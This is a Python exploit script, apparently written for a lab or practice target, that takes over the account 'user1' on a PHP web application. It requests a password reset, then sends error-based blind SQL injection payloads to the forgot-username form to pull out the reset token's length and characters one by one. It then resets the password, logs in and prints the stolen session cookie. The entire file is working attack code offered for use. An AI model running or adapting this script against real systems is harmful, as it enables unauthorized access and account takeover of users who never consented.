#!/usr/bin/env python3

import requests 
import traceback
from urllib.parse import urljoin
import sys
import argparse

PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

def ExfilPassResetToken(target):
    """Request a password reset token for `user1`"""
    ReqRstPassUrl = urljoin(target, "/forgotpassword.php")
    ReqRstPassData = {"username": "user1"}
    try:
        ReqRstPassRes = requests.post(ReqRstPassUrl, data=ReqRstPassData)
        print("[+] Password reset requested for user user1")
    except Exception as e:
        print("[-] Error requesting a reset password token: ", e)
    """
    Token Lenght 
    """
    length = 0
    while True:
        TknLenPayload = f"test';SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE uid=2 LIMIT 1)={length} THEN (1) ELSE 1/(SELECT 0) END--"
        length = length +1 
        TknLenUrl = urljoin(target, "/forgotusername.php")
        TknLenData = {"username": f"{TknLenPayload}"}
        try:
            TknLenghtRes = requests.post(TknLenUrl, TknLenData)
            if TknLenghtRes.status_code == 200 and "User doesn't exist." not in TknLenghtRes.text:
                print(f"[+] Password reset token length: {length}")
                break
        except Exception as e:
            print("[-] Error exfiltrating the token length: ", e)
            traceback.print_exc()
    """
    Exfil Password reset token
    """
    token = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 127):
            exfilTknPayload = f"test';SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,{pos},1))) FROM tokens WHERE uid=2 LIMIT 1)={ascii_code} THEN (1) ELSE 1/(SELECT 0) END--"
            exfilTknUrl = urljoin(target, "/forgotusername.php")
            exfilTknData = {"username": f"{exfilTknPayload}"}
            try:
                exfilTknRes = requests.post(exfilTknUrl, exfilTknData)
                if exfilTknRes.status_code == 200 and "User doesn't exist." not in exfilTknRes.text:
                    sys.stdout.write(chr(ascii_code))
                    sys.stdout.flush()
                    token = token + chr(ascii_code)
            except Exception as e:
                print("[-] Error exfiltrating the token: ", e)
                traceback.print_exc()
    print("\n[+] Password Reset Token Exfiltrated: ", token)
    return token

def nrmlUserLogin(target, passRstToken):
    rstPassUrl = urljoin(target, "/resetpassword.php")
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    newPassword = "Password!1234"
    rstPassData = {"token": f"{passRstToken}", "password1": f"{newPassword}", "password2": f"{newPassword}"}
    rstPassRes = requests.post(rstPassUrl, headers=headers, data=rstPassData)
    if "Token is invalid." not in rstPassRes.text and "Password changed!" in rstPassRes.text:
        print(f"[+] Password for user `user1` was changed successfully. New password: {newPassword}")
        """
        Login
        """
        lgnUrl = urljoin(target, "/login.php")
        lgnData = {"username": "user1", "password": f"{newPassword}"}
        lgnRes = requests.post(lgnUrl, headers=headers, data=lgnData, allow_redirects=False)
        if 'PHPSESSID' in lgnRes.cookies and lgnRes.status_code==302:
            PHPSESSID_value = lgnRes.cookies['PHPSESSID']
            print("[+] Logged in successfully")
            print(f"[+] Cookie: PHPSESSID={PHPSESSID_value}")
            return PHPSESSID_value
        else:
            print("[-] Could not extract PHPSESSID from cookies")
            return None
    else:
        print("[-] Failed to cahnge the password for the user `user1`")

def main():
    parser = argparse.ArgumentParser(description="Exfiltrate password reset token to get an unauthorized access to user `user1`")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    args = parser.parse_args()

    password_reset_token = ExfilPassResetToken(args.target)
    if password_reset_token:
        nrmlUserLogin(args.target, password_reset_token)

if __name__ == "__main__":
    main()
